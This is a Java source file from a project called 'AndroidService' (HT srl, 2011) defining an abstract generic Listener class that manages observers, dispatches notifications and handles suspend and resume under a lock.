/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 20-apr-2011
 **********************************************/

package com.android.networking.listener;

import java.util.ArrayList;
import java.util.List;

import com.android.networking.auto.Cfg;
import com.android.networking.interfaces.Observer;
import com.android.networking.util.Check;

public abstract class Listener<U> {
	/** The Constant TAG. */
	private static final String TAG = "Listener"; //$NON-NLS-1$

	protected List<Observer<U>> observers;

	private boolean suspended;

	private Object suspendLock = new Object();

	public Listener() {
		observers = new ArrayList<Observer<U>>();
	}

	public synchronized boolean attach(Observer<U> o) {
		// Object already in the stack
		if (observers.contains(o)) {
			return false;
		}

		if (observers.isEmpty()) {
			start();
		}

		observers.add(o);
		return true;
	}

	public synchronized void detach(Observer<U> o) {
		if (observers.isEmpty()) {
			return;
		}

		observers.remove(o);

		if (observers.isEmpty()) {
			stop();
		}
	}

	/**
	 * dispatch, per ogni observer registrato viene chiamato il notification
	 * 
	 * @param elem
	 * @return
	 */
	int dispatch(U elem) {
		Object[] array;
		
		synchronized (this) {
			array = observers.toArray();
		}
		int result = 0;

		for (final Object element : array) {
			@SuppressWarnings("unchecked")
			final Observer<U> observer = (Observer<U>) element;
			result |= observer.notification(elem);
		}

		return result;
	}

	public void suspend() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (suspend)"); //$NON-NLS-1$
		}
		synchronized (suspendLock) {
			if (!suspended) {
				suspended = true;
				stop();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (suspend): not suspended");
				}
			}
		}
	}

	public void resume() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resume)"); //$NON-NLS-1$
		}
		synchronized (suspendLock) {
			if (suspended) {
				suspended = false;
				start();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (resume): already suspended");
				}
			}
		}
	}

	public boolean isSuspended() {
		synchronized (suspendLock) {
			return suspended;
		}
	}

	protected void setSuspended(boolean value) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (setSuspended): " + value);
		}
		synchronized (suspendLock) {
			suspended = value;
		}
	}

	protected abstract void start();

	protected abstract void stop();
}
